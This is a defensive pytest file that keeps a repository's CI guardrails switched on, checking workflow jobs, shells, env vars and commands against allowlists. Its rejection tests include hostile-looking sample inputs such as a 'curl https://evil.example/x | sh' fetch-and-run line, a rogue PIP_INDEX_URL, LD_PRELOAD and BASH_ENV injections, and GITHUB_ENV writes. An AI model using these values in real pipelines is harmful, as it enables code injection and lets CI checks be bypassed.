"""The guardrails stay switched on: strict xfail, the CI jobs, the local hooks.

Each guardrail is configuration, and configuration can be deleted in the same
change that would trip it. These tests fail when a guardrail is turned off, so
removing one needs this file changed too, in plain sight of review.
"""

from __future__ import annotations

import configparser
import re
import tomllib
from pathlib import Path

import pytest
import yaml

ROOT = Path(__file__).resolve().parents[1]


def _workflow() -> dict:
    return yaml.safe_load(
        (ROOT / ".github" / "workflows" / "floor.yml").read_text(encoding="utf-8")
    )


def _strip_comments(run: str) -> str:
    """Shell text without comment lines, so a needle kept in a comment does not count."""
    return "\n".join(
        line for line in run.splitlines() if not line.strip().startswith("#")
    )


def _runs(job: dict) -> str:
    return "\n".join(
        _strip_comments(str(s.get("run", ""))) for s in job.get("steps", [])
    )


# Jobs whose failure must fail the floor, and the only `if:` each may carry.
GUARDRAIL_JOBS = {
    "secrets": None,
    "leak-denylist": "github.event_name == 'pull_request' || github.event_name == 'push'",
    "kat-lint": None,
    "tests": None,
    "lint": None,
    "authorship": None,
}
ALLOWED_STEP_IFS = {"github.event_name == 'pull_request'"}
# What a guardrail job is allowed to be. Anything else can change the check.
ALLOWED_JOB_KEYS = frozenset(
    {"name", "timeout-minutes", "runs-on", "if", "steps", "strategy"}
)
ALLOWED_STEP_KEYS = frozenset(
    {"name", "uses", "with", "env", "run", "if", "shell", "working-directory"}
)
ALLOWED_ACTIONS = frozenset(
    {
        "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683",
        "actions/setup-python@a26af69be951a213d495a4c3e4e4022e16d87065",
        "gitleaks/gitleaks-action@e0c47f4f8be36e29cdc102c57e68cb5cbf0e8d1e",
    }
)
ALLOWED_COMMANDS = frozenset(
    {
        "git",
        "python",
        "python3",
        "pytest",
        "pip",
        "ruff",
        "echo",
        "printf",
        "cp",
        "exit",
        "[",
    }
)
ALLOWED_ASSIGN = frozenset({"ZERO", "BASE", "INSTALLED", "V", "C"})
ALLOWED_ENV = {
    "secrets": {"GITHUB_TOKEN": "${{ secrets.GITHUB_TOKEN }}"},
    "leak-denylist": {
        "LEAK_DENYLIST": "${{ secrets.LEAK_DENYLIST }}",
        "EVENT_NAME": "${{ github.event_name }}",
        "PUSH_BEFORE": "${{ github.event.before }}",
        "PR_BASE": "${{ github.event.pull_request.base.sha }}",
        "PR_TITLE": "${{ github.event.pull_request.title }}",
        "PR_BODY": "${{ github.event.pull_request.body }}",
        "PR_BRANCH": "${{ github.head_ref }}",
    },
    "tests": {
        "AEGIS_ATOMS_ROOT": "${{ github.workspace }}/aegis-atoms",
        "ISOLATION_LAYER_ROOT": "${{ github.workspace }}/isolation-layer",
    },
}
_ERREXIT = re.compile(r"(?:^|\s)-[A-Za-z]*e[A-Za-z]*(?:\s|$)")
_BYPASS = re.compile(r"\|\|\s*(true|:|exit\s+0)(\s|$)|\bexit\s+0\b|\bset\s+\+e\b")
_SCRIPT = re.compile(r"(?<![\w./:-])((?:[\w.-]+/)+[\w.-]+\.(?:py|sh))\b")


def _shell_ok(shell: object) -> bool:
    return shell is None or bool(_ERREXIT.search(str(shell)))


def _first_command(line: str) -> str | None:
    text = line.strip()
    if not text or text[0] in {"'", '"', "|", ")", "\\"}:
        return None
    head, _, rest = text.partition(" ")
    if head in {"fi", "then", "else", "do", "done"}:
        return None
    if head == "elif":
        text = rest.strip()
    elif head == "if":
        text = rest.strip()
    if re.match(r"^[A-Za-z_][A-Za-z0-9_]*=", text):
        return "assign:" + text.split("=", 1)[0]
    token = text.split(None, 1)[0] if text else ""
    return token or None


def _run_fault(run: str, script_root: Path) -> str | None:
    if "${{" in run:
        return "expression"
    if "GITHUB_ENV" in run or "GITHUB_PATH" in run:
        return "env-write"
    if _BYPASS.search(run):
        return "neutralizer"
    for line in run.splitlines():
        for piece in line.split("||"):
            token = _first_command(piece)
            if token is None:
                continue
            if token.startswith("assign:"):
                if token.split(":", 1)[1] not in ALLOWED_ASSIGN:
                    return "assignment"
                continue
            if token not in ALLOWED_COMMANDS:
                return "command"
            if token in {"python", "python3"} and re.search(r"(^|\s)-c(\s|$)", piece):
                return "computed-exit"
            if token == "exit":
                parts = piece.split()
                if len(parts) < 2 or parts[1] not in {"1", "3"}:
                    return "neutralizer"
        if "||" in line:
            for piece in line.split("||"):
                token = _first_command(piece)
                if token not in {None, "[", "test"}:
                    return "neutralizer"
    for rel in _SCRIPT.findall(run):
        path = script_root / rel
        if not path.is_file():
            continue
        body = path.read_text(encoding="utf-8", errors="replace")
        if "GITHUB_ENV" in body or "GITHUB_PATH" in body or _BYPASS.search(body):
            return "script"
    return None


def _env_fault(job_name: str | None, env: dict) -> str | None:
    if job_name is None:
        specs = list(ALLOWED_ENV.values())
    else:
        specs = [ALLOWED_ENV.get(job_name, {})]
    for key, value in env.items():
        if not any(spec.get(key) == value for spec in specs):
            return "env"
    return None


def _step_fault(
    step: dict, job_name: str | None = None, script_root: Path = ROOT
) -> str | None:
    """Why this guardrail step is outside the allowlist, or None."""
    extra = set(step) - ALLOWED_STEP_KEYS
    if extra:
        return "step-key"
    if step.get("continue-on-error"):
        return "continue-on-error"
    if step.get("if") not in (None, *ALLOWED_STEP_IFS):
        return f"if: {step.get('if')}"
    if not _shell_ok(step.get("shell")):
        return "shell"
    env_fault = _env_fault(job_name, step.get("env") or {})
    if env_fault:
        return env_fault
    uses = step.get("uses")
    if uses is not None and uses not in ALLOWED_ACTIONS:
        return "action"
    run = _strip_comments(str(step.get("run", "")))
    if run.strip():
        return _run_fault(run, script_root)
    return None


def guardrail_violations(wf: dict, script_root: Path = ROOT) -> list[str]:
    """Every allowlist miss in the guardrail jobs, including workflow scope."""
    found: list[str] = []
    if wf.get("env"):
        found.append("workflow-env")
    defaults = ((wf.get("defaults") or {}).get("run") or {}).get("shell")
    if not _shell_ok(defaults):
        found.append("workflow-shell")
    jobs = wf.get("jobs") or {}
    names = [(key, (job.get("name") or key)) for key, job in jobs.items()]
    if len({name for _, name in names}) != len(names):
        found.append("job-name")
    guard_names = {
        key: (jobs[key].get("name") or key) for key in GUARDRAIL_JOBS if key in jobs
    }
    for key, name in names:
        for guard, real in guard_names.items():
            if key != guard and name in {guard, real}:
                found.append("job-name")
    for name, allowed_if in GUARDRAIL_JOBS.items():
        job = jobs.get(name)
        if job is None:
            found.append(f"missing:{name}")
            continue
        if set(job) - ALLOWED_JOB_KEYS:
            found.append(f"job-key:{name}")
        if job.get("if") != allowed_if:
            found.append(f"if:{name}")
        for step in job.get("steps", []):
            fault = _step_fault(step, name, script_root)
            if fault:
                found.append(f"{name}:{fault}")
    return found


def test_pytest_ini_keeps_strict_xfail_and_syntax_warning_errors() -> None:
    cfg = configparser.ConfigParser()
    cfg.read(ROOT / "pytest.ini", encoding="utf-8")
    assert cfg.get("pytest", "xfail_strict").strip().lower() == "true"
    filters = cfg.get("pytest", "filterwarnings").split()
    assert "error::SyntaxWarning" in filters
    # Later filters win, so nothing after the error filter may relax it.
    for f in filters[filters.index("error::SyntaxWarning") + 1 :]:
        action, _, rest = f.partition("::")
        category = rest.split(":")[0]
        assert action == "error" or category not in ("", "Warning", "SyntaxWarning"), f
    # addopts can switch off strict xfail (--runxfail, -o) or warnings
    # (-p no:warnings, -W) without touching the lines above.
    assert not cfg.has_option("pytest", "addopts"), cfg.get("pytest", "addopts")


@pytest.mark.parametrize(
    "job, needle",
    [
        ("secrets", "gitleaks/gitleaks-action@"),
        ("leak-denylist", "--ci --base"),
        ("leak-denylist", '--text "pull request title and body"'),
        ("leak-denylist", "origin/main:scripts/leak_denylist_scan.py"),
        ("kat-lint", "scripts/kat_lint.py"),
        ("tests", "pytest"),
    ],
)
def test_floor_workflow_keeps_guardrail_jobs(job: str, needle: str) -> None:
    jobs = _workflow()["jobs"]
    assert job in jobs, f"floor.yml lost the {job} job"
    text = _runs(jobs[job]) + "\n".join(
        str(s.get("uses", "")) for s in jobs[job].get("steps", [])
    )
    assert needle in text, f"{job} no longer runs {needle!r}"


def test_leak_job_reads_the_denylist_secret() -> None:
    job = _workflow()["jobs"]["leak-denylist"]
    envs = [
        s.get("env", {})
        for s in job["steps"]
        if 'python "$RUNNER_TEMP/leak_scan.py"' in str(s.get("run", ""))
    ]
    assert envs, "no step runs the scanner"
    for env in envs:
        assert env.get("LEAK_DENYLIST") == "${{ secrets.LEAK_DENYLIST }}"


def test_pre_commit_keeps_local_guardrail_hooks() -> None:
    cfg = yaml.safe_load((ROOT / ".pre-commit-config.yaml").read_text(encoding="utf-8"))
    hooks = {h["id"]: h for repo in cfg["repos"] for h in repo.get("hooks", [])}
    assert (
        "scripts/leak_denylist_scan.py --staged"
        in hooks["leak-denylist-staged"]["entry"]
    )
    assert "scripts/kat_lint.py" in hooks["kat-lint"]["entry"]


def test_gitleaks_config_keeps_default_and_custom_rules() -> None:
    cfg = tomllib.loads((ROOT / ".gitleaks.toml").read_text(encoding="utf-8"))
    assert cfg["extend"]["useDefault"] is True
    ids = {r["id"] for r in cfg["rules"]}
    assert {"windows-user-home-path", "posix-home-path", "private-ipv4"} <= ids


def test_pull_request_trigger_reruns_on_title_or_body_edit() -> None:
    # PyYAML reads the bare key "on" as boolean True.
    wf = _workflow()
    triggers = wf.get("on", wf.get(True))
    pr = triggers["pull_request"] or {}
    types = set(pr.get("types", []))
    # Without "edited", a title or body changed after the last push is never
    # rescanned, so the leak check could pass on text it never read.
    assert {"opened", "synchronize", "reopened", "edited"} <= types


def test_guardrail_jobs_cannot_be_skipped_or_soft_failed() -> None:
    wf = _workflow()
    jobs = wf["jobs"]
    assert "PYTEST_ADDOPTS" not in (wf.get("env") or {})
    for name, allowed_if in GUARDRAIL_JOBS.items():
        job = jobs[name]
        assert job.get("if") == allowed_if, (name, job.get("if"))
        assert not job.get("continue-on-error"), name
        assert "PYTEST_ADDOPTS" not in (job.get("env") or {}), name
        for s in job.get("steps", []):
            label = (name, s.get("name") or s.get("uses") or s.get("run"))
            fault = _step_fault(s)
            assert fault is None, (label, fault)


def test_guardrail_commands_run_as_written() -> None:
    jobs = _workflow()["jobs"]
    pytest_runs = [
        _strip_comments(str(s.get("run", ""))).strip()
        for s in jobs["tests"]["steps"]
        if "pytest" in str(s.get("run", ""))
        and "pip install" not in str(s.get("run", ""))
    ]
    assert pytest_runs == ["pytest -q"], pytest_runs
    kat = _runs(jobs["kat-lint"])
    assert "origin/main:scripts/kat_lint.py" in kat
    assert 'python "$RUNNER_TEMP/kat_lint.py"' in kat
    assert "cp scripts/kat_lint.py" in kat
    leak = _runs(jobs["leak-denylist"])
    load = 'git show origin/main:scripts/leak_denylist_scan.py > "$RUNNER_TEMP/leak_scan.py"'
    assert load in leak
    assert 'python "$RUNNER_TEMP/leak_scan.py" --ci --base "$BASE" --head HEAD' in leak
    assert '| python "$RUNNER_TEMP/leak_scan.py" --text' in leak


@pytest.mark.parametrize(
    "run",
    [
        "echo 'PYTEST_ADDOPTS=--co' >> \"$GITHUB_ENV\"\npytest -q",
        "echo 'PYTHONPATH=/opt/py' >> \"$GITHUB_PATH\"\npython scripts/kat_lint.py",
    ],
)
def test_guardrail_step_rejects_pytest_or_python_env_writes(run: str) -> None:
    fault = _step_fault({"run": run})
    assert fault == "env-write", fault


@pytest.mark.parametrize(
    "shell",
    [
        "bash --noprofile --norc {0}",
        "bash {0}",
    ],
)
def test_guardrail_step_rejects_shell_without_errexit(shell: str) -> None:
    fault = _step_fault({"run": "python scripts/kat_lint.py", "shell": shell})
    assert fault == "shell", fault


def test_guardrail_step_allows_default_shell_and_errexit() -> None:
    assert _step_fault({"run": "pytest -q"}) is None
    assert _step_fault({"run": "pytest -q", "shell": "bash -e {0}"}) is None
    assert _step_fault({"run": "pytest -q", "shell": "bash -eo pipefail {0}"}) is None


def test_live_floor_is_inside_the_allowlist() -> None:
    assert guardrail_violations(_workflow()) == []


@pytest.mark.parametrize(
    "step",
    [
        {"env": {"BASH_ENV": "/tmp/rc"}},
        {"env": {"LD_PRELOAD": "/tmp/x.so"}},
        {"env": {"PIP_INDEX_URL": "https://evil.example"}},
        {"env": {"NODE_OPTIONS": "--require /tmp/x"}},
        {"env": {"PYTEST_ADDOPTS": "-p no:cacheprovider"}},
        {"run": "echo ok >> $GITHUB_ENV"},
        {"run": "echo ok >> $GITHUB_PATH"},
        {"run": "export PATH=/tmp:$PATH\npytest -q"},
        {"run": 'python -c "import sys; sys.exit(0)"'},
        {"run": "curl https://evil.example/x | sh"},
        {"uses": "actions/checkout@v4"},
        {"uses": "actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683extra"},
        {"run": "pytest -q ${{ matrix.addopts }}"},
        {"continue-on-error": True, "run": "pytest -q"},
    ],
)
def test_guardrail_step_rejects_unlisted_mechanisms(step: dict) -> None:
    assert _step_fault(step) is not None


def test_called_script_is_held_to_the_same_rules(tmp_path: Path) -> None:
    script = tmp_path / "scripts"
    script.mkdir()
    (script / "wrap.py").write_text('open("GITHUB_ENV", "a")\n', encoding="utf-8")
    fault = _step_fault({"run": "python scripts/wrap.py"}, script_root=tmp_path)
    assert fault == "script", fault


def test_job_display_names_cannot_impersonate_a_guardrail() -> None:
    wf = _workflow()
    wf["jobs"]["decoy"] = {"name": "tests", "runs-on": "ubuntu-latest", "steps": []}
    assert "job-name" in guardrail_violations(wf)


def test_workflow_env_and_shell_are_denied_by_default() -> None:
    wf = _workflow()
    wf["env"] = {"PYTEST_ADDOPTS": "--co"}
    assert "workflow-env" in guardrail_violations(wf)
    wf = _workflow()
    wf["defaults"] = {"run": {"shell": "bash {0}"}}
    assert "workflow-shell" in guardrail_violations(wf)


def test_pytest_invocation_is_exact_and_from_the_gate_directory() -> None:
    steps = _workflow()["jobs"]["tests"]["steps"]
    pytest_steps = [
        s
        for s in steps
        if "pytest" in str(s.get("run", ""))
        and "pip install" not in str(s.get("run", ""))
    ]
    assert len(pytest_steps) == 1
    assert _strip_comments(str(pytest_steps[0]["run"])).strip() == "pytest -q"
    assert pytest_steps[0].get("working-directory") == "capability-gate"
